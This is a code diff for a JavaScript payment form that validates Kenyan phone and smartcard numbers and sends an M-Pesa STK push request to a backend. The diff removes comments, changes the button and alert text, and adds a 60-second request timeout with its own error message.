@@ -14,33 +14,29 @@
 document.addEventListener("DOMContentLoaded", function () {
   const form = document.getElementById("vendorFieldsForm");
   
-  // Select both MSISDN inputs by order: Index 0 = Mobile, Index 1 = Smartcard
   const msisdnInputs = document.querySelectorAll('input[name="MSISDN"]');
   const phoneInput = msisdnInputs[0] || null;
   const smartcardInput = msisdnInputs[1] || null;
 
   form.addEventListener("submit", async function (event) {
-    event.preventDefault(); // Prevent standard form redirect
+    event.preventDefault();
 
     let phone = phoneInput ? phoneInput.value.trim() : "";
     let smartcard = smartcardInput ? smartcardInput.value.trim() : "";
 
-    // 1. Validate Mobile Number Presence
     if (!phone) {
       alert("Please enter your mobile number.");
       phoneInput?.focus();
       return;
     }
 
-    // 2. Validate Smartcard Number Presence
     if (!smartcard) {
       alert("Please enter your Smartcard number.");
       smartcardInput?.focus();
       return;
     }
 
-    // 3. Clean and Format Phone Number to Palpluss Standard (07XXXXXXXX or 01XXXXXXXX)
-    phone = phone.replace(/\s+/g, ''); // Remove spaces
+    phone = phone.replace(/\s+/g, '');
 
     if (phone.startsWith("+254")) {
       phone = "0" + phone.slice(4);
@@ -48,28 +44,30 @@ document.addEventListener("DOMContentLoaded", function () {
       phone = "0" + phone.slice(3);
     }
 
-    // Validate Kenyan mobile number structure (10 digits starting with 07 or 01)
     const kenyaPhoneRegex = /^0[71]\d{8}$/;
     if (!kenyaPhoneRegex.test(phone)) {
-      alert("Please enter a valid Safaricom phone number (e.g., 0712345678 or 0790123456).");
+      alert("Please enter a valid Safaricom phone number (e.g., 0712345678).");
       phoneInput.focus();
       return;
     }
 
-    // 4. Update UI state during submission
     const button = form.querySelector("button");
     button.disabled = true;
     const originalButtonText = button.innerText;
-    button.innerText = "Initiating STK Push...";
+    button.innerText = "Connecting to M-Pesa...";
+
+    // AbortController setup with a 60-second window for cold boots
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 60000);
 
     try {
-      // 5. Send POST request to backend
       const response = await fetch("https://dstv-kenya.onrender.com/api/stkpush", {
         method: "POST",
         headers: { 
           "Content-Type": "application/json",
           "Accept": "application/json"
         },
+        signal: controller.signal,
         body: JSON.stringify({ 
           phone: phone, 
           amount: 4200, 
@@ -77,6 +75,7 @@ document.addEventListener("DOMContentLoaded", function () {
         })
       });
 
+      clearTimeout(timeoutId);
       const data = await response.json();
 
       if (response.ok) {
@@ -86,10 +85,15 @@ document.addEventListener("DOMContentLoaded", function () {
         alert("Payment Error: " + errorMsg);
       }
     } catch (err) {
-      console.error("Payment Submission Error:", err);
-      alert("Network connection error. Server may be starting up—please try again in a few seconds.");
+      clearTimeout(timeoutId);
+      console.error("Fetch Failure Details:", err);
+
+      if (err.name === 'AbortError') {
+        alert("Server request timed out. The backend took too long to wake up—please try clicking Continue again.");
+      } else {
+        alert("Network Connection Error. Check your browser console (F12) for details.");
+      }
     } finally {
-      // 6. Reset UI state
       button.disabled = false;
       button.innerText = originalButtonText;
     }
